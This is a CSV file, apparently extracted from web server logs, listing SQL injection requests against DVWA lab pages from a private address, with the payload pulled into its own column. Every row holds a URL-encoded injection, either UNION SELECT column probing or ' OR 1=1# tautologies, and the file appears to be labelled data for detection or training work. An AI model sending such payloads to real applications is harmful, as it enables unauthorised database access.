ip,url,date,sqlInjection
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204,%205,%206"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204,%205,%206,%207"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201--&Submit=Submit,15/May/2024:03:48:38,'%20union%20select%201--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201--&Submit=Submit,15/May/2024:03:48:49,'%20union%20select%201--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20--%20&Submit=Submit,15/May/2024:03:50:11,'%20union%20select%201%20--%20&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:51:17,'%20union%20select%201%20
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:51:21,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:51:33,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1+--&Submit=Submit,15/May/2024:03:51:52,%27+OR+1%3D1+--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli_blind/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:51:54,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:52:26,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:52:53,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:52:58,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:53:04,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:53:08,'%20union%20select%201%20
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:53:59,'%20union%20select%201%20
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:54:20,'%20union%20select%201%20
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202%20",15/May/2024:03:54:20,"'%20union%20select%201,%202%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203,%204%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203,%204,%205%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203,%204,%205,%206%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203,%204,%205,%206,%207%20"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20--&Submit=Submit,15/May/2024:03:54:32,'%20union%20select%201%20--&Submit=Submit
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203,%204%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203,%204,%205%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203,%204,%205,%206%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203,%204,%205,%206,%207%20--&Submit=Submit"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:54:51,'%20union%20select%201%20
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202%20",15/May/2024:03:54:51,"'%20union%20select%201,%202%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204,%205%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204,%205,%206%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204,%205,%206,%207%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207,%208%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204,%205,%206,%207,%208%20"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:43:33,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:43:42,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:43:44,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6'%20OR%201=1,15/May/2024:04:44:49,'%20OR%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6'%27OR%271=1,15/May/2024:04:45:06,'%27OR%271=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6'%20OR%201=1,15/May/2024:04:45:13,'%20OR%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23,15/May/2024:04:46:11,%27+OR+1%3D1%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23,15/May/2024:04:46:34,%27+OR+1%3D1%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6%27+OR+1%3D1%23,15/May/2024:04:46:47,%27+OR+1%3D1%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit%23,15/May/2024:04:47:04,%27+OR+1%3D1%23&Submit=Submit%23
